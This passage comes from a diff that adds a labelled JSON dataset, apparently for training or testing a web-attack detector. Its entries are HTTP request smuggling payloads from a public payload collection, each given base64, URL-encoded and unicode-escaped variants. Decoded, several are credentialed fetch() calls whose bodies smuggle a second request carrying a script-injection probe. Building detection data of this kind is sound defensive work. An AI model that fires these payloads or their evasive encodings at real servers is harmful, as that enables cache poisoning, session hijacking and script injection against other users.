+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00024",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "fc5d49bbaf39f98b659cbafac841654f529b9690293d106902a27acb82aad4b6",
+    "original_id": "raw_hsmug_00024",
+    "original_payload": "GET / HTTP/1.1",
+    "obfuscated_payload": "R0VUIC8gSFRUUC8xLjE",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 64464055,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00024__obf03",
+    "payload": "GET \\u002f HTTP/1.1",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00024",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "fc5d49bbaf39f98b659cbafac841654f529b9690293d106902a27acb82aad4b6",
+    "original_id": "raw_hsmug_00024",
+    "original_payload": "GET / HTTP/1.1",
+    "obfuscated_payload": "GET \\u002f HTTP/1.1",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific_fallback",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 64465064,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00024__obf04",
+    "payload": "R0VUIC8gSFRUUC8xLjE=",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00024",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "fc5d49bbaf39f98b659cbafac841654f529b9690293d106902a27acb82aad4b6",
+    "original_id": "raw_hsmug_00024",
+    "original_payload": "GET / HTTP/1.1",
+    "obfuscated_payload": "R0VUIC8gSFRUUC8xLjE=",
+    "obfuscation_chain": [
+      "base64_urlsafe"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode"
+    ],
+    "generation_seed": 64466073,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00025__obf01",
+    "payload": "%66etch('https://w%77w.exam%70l%65.com/', {me%74ho%64: 'POST', bo%64y: \"GET / HTTP/1.1\\%72\\nHost: www.ex%61mple.com\", mode: 'no-cors', c%72ede%6Etials: 'incl%75de'} )",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00025",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "11967015d5e2797342932b82057f254b42e759f28efd6e7e6c9477af0e80adb6",
+    "original_id": "raw_hsmug_00025",
+    "original_payload": "fetch('https://www.example.com/', {method: 'POST', body: \"GET / HTTP/1.1\\r\\nHost: www.example.com\", mode: 'no-cors', credentials: 'include'} )",
+    "obfuscated_payload": "%66etch('https://w%77w.exam%70l%65.com/', {me%74ho%64: 'POST', bo%64y: \"GET / HTTP/1.1\\%72\\nHost: www.ex%61mple.com\", mode: 'no-cors', c%72ede%6Etials: 'incl%75de'} )",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 64563049,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00025__obf02",
+    "payload": "ZmV0Y2goJ2h0dHBzOi8vd3d3LmV4YW1wbGUuY29tLycsIHttZXRob2Q6ICdQT1NUJywgYm9keTogIkdFVCAvIEhUVFAvMS4xXHJcbkhvc3Q6IHd3dy5leGFtcGxlLmNvbSIsIG1vZGU6ICduby1jb3JzJywgY3JlZGVudGlhbHM6ICdpbmNsdWRlJ30gKQ",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00025",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "11967015d5e2797342932b82057f254b42e759f28efd6e7e6c9477af0e80adb6",
+    "original_id": "raw_hsmug_00025",
+    "original_payload": "fetch('https://www.example.com/', {method: 'POST', body: \"GET / HTTP/1.1\\r\\nHost: www.example.com\", mode: 'no-cors', credentials: 'include'} )",
+    "obfuscated_payload": "ZmV0Y2goJ2h0dHBzOi8vd3d3LmV4YW1wbGUuY29tLycsIHttZXRob2Q6ICdQT1NUJywgYm9keTogIkdFVCAvIEhUVFAvMS4xXHJcbkhvc3Q6IHd3dy5leGFtcGxlLmNvbSIsIG1vZGU6ICduby1jb3JzJywgY3JlZGVudGlhbHM6ICdpbmNsdWRlJ30gKQ",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 64564058,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00025__obf03",
+    "payload": "fetch(\\u0027https\\u003a\\u002f/www.example.com\\u002f', \\u007bmethod\\u003a \\u0027POST', body: \"GET \\u002f HTTP/1.1\\u005cr\\nHost: www.example.com\\u0022, mode: 'no-cors\\u0027, credentials\\u003a 'include\\u0027} \\u0029",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00025",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "11967015d5e2797342932b82057f254b42e759f28efd6e7e6c9477af0e80adb6",
+    "original_id": "raw_hsmug_00025",
+    "original_payload": "fetch('https://www.example.com/', {method: 'POST', body: \"GET / HTTP/1.1\\r\\nHost: www.example.com\", mode: 'no-cors', credentials: 'include'} )",
+    "obfuscated_payload": "fetch(\\u0027https\\u003a\\u002f/www.example.com\\u002f', \\u007bmethod\\u003a \\u0027POST', body: \"GET \\u002f HTTP/1.1\\u005cr\\nHost: www.example.com\\u0022, mode: 'no-cors\\u0027, credentials\\u003a 'include\\u0027} \\u0029",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific_fallback",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 64565067,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00025__obf04",
+    "payload": "fetc%68('https://www.%65xample.%63om/', {me%74hod: 'POS%54', b%6Fdy: \"GET / HTTP/1.%31\\r\\nHost: www%2Eex%61%6Dple.com\", mode: 'no-cor%73', credentials: 'includ%65'} )",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00025",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "11967015d5e2797342932b82057f254b42e759f28efd6e7e6c9477af0e80adb6",
+    "original_id": "raw_hsmug_00025",
+    "original_payload": "fetch('https://www.example.com/', {method: 'POST', body: \"GET / HTTP/1.1\\r\\nHost: www.example.com\", mode: 'no-cors', credentials: 'include'} )",
+    "obfuscated_payload": "fetc%68('https://www.%65xample.%63om/', {me%74hod: 'POS%54', b%6Fdy: \"GET / HTTP/1.%31\\r\\nHost: www%2Eex%61%6Dple.com\", mode: 'no-cor%73', credentials: 'includ%65'} )",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 64566076,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00026__obf01",
+    "payload": "fetch('h%74t%70s://www%2Eexamp%6Ce.com/redirec%74', {\n    method: 'PO%53%54',\n        bo%64y: `HEAD /404/ HTTP/1.1\\r\\nHost: www.exam%70l%65.%63om\\r\\n\\r\\nGET /x?x=<sc%72%69pt>%61lert(1)</scrip%74> HTTP/1.1\\r\\nX: %59`,\n        credentials: 'includ%65',\n        %6D%6Fde: 'cors' // throw an error i%6Este%61%64 %6Ff foll%6F%77in%67 re%64%69rect\n})%2Eca%74%63%68(() => {\n        loca%74%69o%6E = 'ht%74ps://ww%77%2Eexa%6D%70l%65%2Ecom/'\n})",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00026",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "8cf8d76ca5699da1078d3b6acf7f1c8b008287d69ce735589d79b99c1c4de9bd",
+    "original_id": "raw_hsmug_00026",
+    "original_payload": "fetch('https://www.example.com/redirect', {\n    method: 'POST',\n        body: `HEAD /404/ HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\nGET /x?x=<script>alert(1)</script> HTTP/1.1\\r\\nX: Y`,\n        credentials: 'include',\n        mode: 'cors' // throw an error instead of following redirect\n}).catch(() => {\n        location = 'https://www.example.com/'\n})",
+    "obfuscated_payload": "fetch('h%74t%70s://www%2Eexamp%6Ce.com/redirec%74', {\n    method: 'PO%53%54',\n        bo%64y: `HEAD /404/ HTTP/1.1\\r\\nHost: www.exam%70l%65.%63om\\r\\n\\r\\nGET /x?x=<sc%72%69pt>%61lert(1)</scrip%74> HTTP/1.1\\r\\nX: %59`,\n        credentials: 'includ%65',\n        %6D%6Fde: 'cors' // throw an error i%6Este%61%64 %6Ff foll%6F%77in%67 re%64%69rect\n})%2Eca%74%63%68(() => {\n        loca%74%69o%6E = 'ht%74ps://ww%77%2Eexa%6D%70l%65%2Ecom/'\n})",
+    "obfuscation_chain": [
+      "url_encode_unreserved"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 64663052,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00026__obf02",
+    "payload": "ZmV0Y2goJ2h0dHBzOi8vd3d3LmV4YW1wbGUuY29tL3JlZGlyZWN0JywgewogICAgbWV0aG9kOiAnUE9TVCcsCiAgICAgICAgYm9keTogYEhFQUQgLzQwNC8gSFRUUC8xLjFcclxuSG9zdDogd3d3LmV4YW1wbGUuY29tXHJcblxyXG5HRVQgL3g_eD08c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ-IEhUVFAvMS4xXHJcblg6IFlgLAogICAgICAgIGNyZWRlbnRpYWxzOiAnaW5jbHVkZScsCiAgICAgICAgbW9kZTogJ2NvcnMnIC8vIHRocm93IGFuIGVycm9yIGluc3RlYWQgb2YgZm9sbG93aW5nIHJlZGlyZWN0Cn0pLmNhdGNoKCgpID0-IHsKICAgICAgICBsb2NhdGlvbiA9ICdodHRwczovL3d3dy5leGFtcGxlLmNvbS8nCn0p",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00026",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "8cf8d76ca5699da1078d3b6acf7f1c8b008287d69ce735589d79b99c1c4de9bd",
+    "original_id": "raw_hsmug_00026",
+    "original_payload": "fetch('https://www.example.com/redirect', {\n    method: 'POST',\n        body: `HEAD /404/ HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\nGET /x?x=<script>alert(1)</script> HTTP/1.1\\r\\nX: Y`,\n        credentials: 'include',\n        mode: 'cors' // throw an error instead of following redirect\n}).catch(() => {\n        location = 'https://www.example.com/'\n})",
+    "obfuscated_payload": "ZmV0Y2goJ2h0dHBzOi8vd3d3LmV4YW1wbGUuY29tL3JlZGlyZWN0JywgewogICAgbWV0aG9kOiAnUE9TVCcsCiAgICAgICAgYm9keTogYEhFQUQgLzQwNC8gSFRUUC8xLjFcclxuSG9zdDogd3d3LmV4YW1wbGUuY29tXHJcblxyXG5HRVQgL3g_eD08c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ-IEhUVFAvMS4xXHJcblg6IFlgLAogICAgICAgIGNyZWRlbnRpYWxzOiAnaW5jbHVkZScsCiAgICAgICAgbW9kZTogJ2NvcnMnIC8vIHRocm93IGFuIGVycm9yIGluc3RlYWQgb2YgZm9sbG93aW5nIHJlZGlyZWN0Cn0pLmNhdGNoKCgpID0-IHsKICAgICAgICBsb2NhdGlvbiA9ICdodHRwczovL3d3dy5leGFtcGxlLmNvbS8nCn0p",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 64664061,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00026__obf03",
+    "payload": "fetch\\u0028\\u0027https:/\\u002fwww.example.com\\u002fredirect\\u0027, {\n    method: 'POST\\u0027,\n        body: `HEAD \\u002f404\\u002f HTTP/1.1\\u005cr\\u005cnHost\\u003a www.example.com\\u005cr\\u005cn\\u005cr\\u005cnGET \\u002fx?x=\\u003cscript>alert(1\\u0029\\u003c/script\\u003e HTTP/1.1\\r\\nX\\u003a Y`,\n        credentials: \\u0027include\\u0027,\n        mode: \\u0027cors\\u0027 /\\u002f throw an error instead of following redirect\n}).catch(() => {\n        location \\u003d \\u0027https\\u003a\\u002f\\u002fwww.example.com\\u002f\\u0027\n\\u007d)",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00026",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "8cf8d76ca5699da1078d3b6acf7f1c8b008287d69ce735589d79b99c1c4de9bd",
+    "original_id": "raw_hsmug_00026",
+    "original_payload": "fetch('https://www.example.com/redirect', {\n    method: 'POST',\n        body: `HEAD /404/ HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\nGET /x?x=<script>alert(1)</script> HTTP/1.1\\r\\nX: Y`,\n        credentials: 'include',\n        mode: 'cors' // throw an error instead of following redirect\n}).catch(() => {\n        location = 'https://www.example.com/'\n})",
+    "obfuscated_payload": "fetch\\u0028\\u0027https:/\\u002fwww.example.com\\u002fredirect\\u0027, {\n    method: 'POST\\u0027,\n        body: `HEAD \\u002f404\\u002f HTTP/1.1\\u005cr\\u005cnHost\\u003a www.example.com\\u005cr\\u005cn\\u005cr\\u005cnGET \\u002fx?x=\\u003cscript>alert(1\\u0029\\u003c/script\\u003e HTTP/1.1\\r\\nX\\u003a Y`,\n        credentials: \\u0027include\\u0027,\n        mode: \\u0027cors\\u0027 /\\u002f throw an error instead of following redirect\n}).catch(() => {\n        location \\u003d \\u0027https\\u003a\\u002f\\u002fwww.example.com\\u002f\\u0027\n\\u007d)",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific_fallback",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 64665070,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00026__obf04",
+    "payload": "fetch%28'https%3A/%2Fwww.example.com%2Fredirect%27%2C {%0A%20 %20%20method%3A 'POST',\n%20%20%20 %20 %20%20body:%20`HEAD%20/404%2F%20HTTP%2F1.1\\r%5CnHost:%20www.example.com%5Cr%5Cn\\r\\nGET %2Fx%3Fx%3D%3Cscript%3Ealert%281%29<%2Fscript%3E HTTP%2F1.1\\r%5CnX%3A Y`,%0A%20%20%20%20%20%20 %20credentials: %27include%27%2C\n  %20 %20%20%20 mode:%20%27cors'%20%2F%2F%20throw%20an error%20instead%20of following redirect%0A%7D%29.catch%28%28%29%20%3D%3E%20{\n   %20%20%20 %20location%20=%20'https%3A%2F%2Fwww.example.com%2F'%0A%7D)",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00026",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "8cf8d76ca5699da1078d3b6acf7f1c8b008287d69ce735589d79b99c1c4de9bd",
+    "original_id": "raw_hsmug_00026",
+    "original_payload": "fetch('https://www.example.com/redirect', {\n    method: 'POST',\n        body: `HEAD /404/ HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\nGET /x?x=<script>alert(1)</script> HTTP/1.1\\r\\nX: Y`,\n        credentials: 'include',\n        mode: 'cors' // throw an error instead of following redirect\n}).catch(() => {\n        location = 'https://www.example.com/'\n})",
+    "obfuscated_payload": "fetch%28'https%3A/%2Fwww.example.com%2Fredirect%27%2C {%0A%20 %20%20method%3A 'POST',\n%20%20%20 %20 %20%20body:%20`HEAD%20/404%2F%20HTTP%2F1.1\\r%5CnHost:%20www.example.com%5Cr%5Cn\\r\\nGET %2Fx%3Fx%3D%3Cscript%3Ealert%281%29<%2Fscript%3E HTTP%2F1.1\\r%5CnX%3A Y`,%0A%20%20%20%20%20%20 %20credentials: %27include%27%2C\n  %20 %20%20%20 mode:%20%27cors'%20%2F%2F%20throw%20an error%20instead%20of following redirect%0A%7D%29.catch%28%28%29%20%3D%3E%20{\n   %20%20%20 %20location%20=%20'https%3A%2F%2Fwww.example.com%2F'%0A%7D)",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 64666079,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00027__obf01",
+    "payload": "body%3A%20`HEAD%20%2F404%2F%20HTTP%2F1.1\\r%5CnHost%3A www.example.com%5Cr\\n%5Cr\\nGET%20%2Fx%3Fx=<script%3Ealert%281)%3C%2Fscript%3E HTTP%2F1.1%5Cr%5CnX%3A%20Y`,",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00027",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "41728835a581f0a24b19b3de96426103ec7da2e37ceab403adc9d2d2918cc2b5",
+    "original_id": "raw_hsmug_00027",
+    "original_payload": "body: `HEAD /404/ HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\nGET /x?x=<script>alert(1)</script> HTTP/1.1\\r\\nX: Y`,",
+    "obfuscated_payload": "body%3A%20`HEAD%20%2F404%2F%20HTTP%2F1.1\\r%5CnHost%3A www.example.com%5Cr\\n%5Cr\\nGET%20%2Fx%3Fx=<script%3Ealert%281)%3C%2Fscript%3E HTTP%2F1.1%5Cr%5CnX%3A%20Y`,",
+    "obfuscation_chain": [
+      "url_encode_selective"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 64763055,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00027__obf02",
+    "payload": "Ym9keTogYEhFQUQgLzQwNC8gSFRUUC8xLjFcclxuSG9zdDogd3d3LmV4YW1wbGUuY29tXHJcblxyXG5HRVQgL3g/eD08c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+IEhUVFAvMS4xXHJcblg6IFlgLA==",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00027",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "41728835a581f0a24b19b3de96426103ec7da2e37ceab403adc9d2d2918cc2b5",
+    "original_id": "raw_hsmug_00027",
+    "original_payload": "body: `HEAD /404/ HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\nGET /x?x=<script>alert(1)</script> HTTP/1.1\\r\\nX: Y`,",
+    "obfuscated_payload": "Ym9keTogYEhFQUQgLzQwNC8gSFRUUC8xLjFcclxuSG9zdDogd3d3LmV4YW1wbGUuY29tXHJcblxyXG5HRVQgL3g/eD08c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ+IEhUVFAvMS4xXHJcblg6IFlgLA==",
+    "obfuscation_chain": [
+      "base64_standard"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_base64",
+    "decoder_requirements": [
+      "base64_decode"
+    ],
+    "generation_seed": 64764064,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00027__obf03",
+    "payload": "body\\u003a `HEAD /404\\u002f HTTP\\u002f1.1\\u005cr\\u005cnHost: www.example.com\\u005cr\\n\\u005cr\\u005cnGET \\u002fx?x=<script\\u003ealert\\u00281\\u0029<\\u002fscript\\u003e HTTP\\u002f1.1\\u005cr\\u005cnX: Y`,",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00027",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "41728835a581f0a24b19b3de96426103ec7da2e37ceab403adc9d2d2918cc2b5",
+    "original_id": "raw_hsmug_00027",
+    "original_payload": "body: `HEAD /404/ HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\nGET /x?x=<script>alert(1)</script> HTTP/1.1\\r\\nX: Y`,",
+    "obfuscated_payload": "body\\u003a `HEAD /404\\u002f HTTP\\u002f1.1\\u005cr\\u005cnHost: www.example.com\\u005cr\\n\\u005cr\\u005cnGET \\u002fx?x=<script\\u003ealert\\u00281\\u0029<\\u002fscript\\u003e HTTP\\u002f1.1\\u005cr\\u005cnX: Y`,",
+    "obfuscation_chain": [
+      "unicode_escape_punctuation"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "specific_fallback",
+    "decoder_requirements": [
+      "unicode_escape_decode"
+    ],
+    "generation_seed": 64765073,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00027__obf04",
+    "payload": "Ym9keTogYEhFQUQgLzQwNC8gSFRUUC8xLjFcclxuSG9zdDogd3d3LmV4YW1wbGUuY29tXHJcblxyXG5HRVQgL3g_eD08c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ-IEhUVFAvMS4xXHJcblg6IFlgLA",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00027",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "41728835a581f0a24b19b3de96426103ec7da2e37ceab403adc9d2d2918cc2b5",
+    "original_id": "raw_hsmug_00027",
+    "original_payload": "body: `HEAD /404/ HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\nGET /x?x=<script>alert(1)</script> HTTP/1.1\\r\\nX: Y`,",
+    "obfuscated_payload": "Ym9keTogYEhFQUQgLzQwNC8gSFRUUC8xLjFcclxuSG9zdDogd3d3LmV4YW1wbGUuY29tXHJcblxyXG5HRVQgL3g_eD08c2NyaXB0PmFsZXJ0KDEpPC9zY3JpcHQ-IEhUVFAvMS4xXHJcblg6IFlgLA",
+    "obfuscation_chain": [
+      "base64_urlsafe_nopad"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "hybrid",
+    "decoder_requirements": [
+      "base64url_decode_allow_missing_padding"
+    ],
+    "generation_seed": 64766082,
+    "equivalence_scope": "explicit-decoder-required"
+  },
+  {
+    "id": "raw_hsmug_00028__obf01",
+    "payload": "HEAD%20%2F404%2F%20HTTP%2F1.1%5Cr%5CnHost%3A%20www.example.com%5Cr%5Cn%5Cr%5CnGET%20%2Fx%3Fx%3D%3Cscript%3Ealert%281%29%3C%2Fscript%3E%20HTTP%2F1.1%5Cr%5CnX%3A%20Y",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00028",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c96a714464917ba94ec636b79f25e538a13bcb0ea79b52c58d1f9e30d63edcd2",
+    "original_id": "raw_hsmug_00028",
+    "original_payload": "HEAD /404/ HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\nGET /x?x=<script>alert(1)</script> HTTP/1.1\\r\\nX: Y",
+    "obfuscated_payload": "HEAD%20%2F404%2F%20HTTP%2F1.1%5Cr%5CnHost%3A%20www.example.com%5Cr%5Cn%5Cr%5CnGET%20%2Fx%3Fx%3D%3Cscript%3Ealert%281%29%3C%2Fscript%3E%20HTTP%2F1.1%5Cr%5CnX%3A%20Y",
+    "obfuscation_chain": [
+      "url_encode_all"
+    ],
+    "obfuscation_depth": 1,
+    "obfuscation_profile": "generic_url",
+    "decoder_requirements": [
+      "url_decode"
+    ],
+    "generation_seed": 64863058,
+    "equivalence_scope": "normalization-layer-dependent"
+  },
+  {
+    "id": "raw_hsmug_00028__obf02",
+    "payload": "SEVBRCAvNDA0LyBIVFRQLzEuMVxyXG5Ib3N0OiB3d3cuZXhhbXBsZS5jb21cclxuXHJcbkdFVCAveD94PTxzY3JpcHQ-YWxlcnQoMSk8L3NjcmlwdD4gSFRUUC8xLjFcclxuWDogWQ==",
+    "label": 1,
+    "attack_type": "hsmug",
+    "attack_subtype": "external_curated",
+    "param_location": "body",
+    "source": "Generated:raw_hsmug_00028",
+    "source_url": "https://github.com/swisskyrepo/PayloadsAllTheThings/blob/5443cbde384134094f25b1b440695757a2803d55/Request%20Smuggling/README.md",
+    "source_path": "Request Smuggling/README.md",
+    "source_version": "5443cbde384134094f25b1b440695757a2803d55",
+    "payload_sha256": "c96a714464917ba94ec636b79f25e538a13bcb0ea79b52c58d1f9e30d63edcd2",
+    "original_id": "raw_hsmug_00028",
+    "original_payload": "HEAD /404/ HTTP/1.1\\r\\nHost: www.example.com\\r\\n\\r\\nGET /x?x=<script>alert(1)</script> HTTP/1.1\\r\\nX: Y",
